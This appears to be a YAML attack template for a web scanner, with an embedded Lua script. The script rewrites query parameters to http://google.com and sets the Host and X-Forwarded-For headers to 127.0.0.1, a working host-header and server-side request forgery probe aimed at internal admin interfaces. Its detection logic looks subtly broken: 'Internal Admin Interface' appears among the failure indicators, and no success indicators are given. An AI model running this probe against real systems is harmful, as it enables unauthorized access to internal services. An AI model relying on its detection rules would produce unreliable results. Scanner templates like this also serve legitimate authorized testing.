# 30. unknown_host_header.yaml
meta:
  id: unknown_host_header
  version: 2
  name: "Unknown Host Header Attack"
  description: "Sends request with Host header pointing to internal IP"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 85
  confidence: 80
  severity: high
  tags: [host_header, internal, bypass]
  references: []
  success_indicator: []
  failure_indicator:
    - "literal:Internal Admin Interface"
    - "literal:<html"
    - "literal:<!DOCTYPE"
    - "literal:404"
    - "literal:Access Denied"
    - "literal:Forbidden"

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "http://google.com"
        local host_value = "127.0.0.1"
        for _, target in ipairs(targets) do
            local base_url = target.url
            for _, param in ipairs(target.params) do
                local new_url = base_url
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end
                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = {
                        ["X-Forwarded-For"] = host_value,
                        ["Host"] = host_value,
                    },
                })
            end
        end
        return results
    end
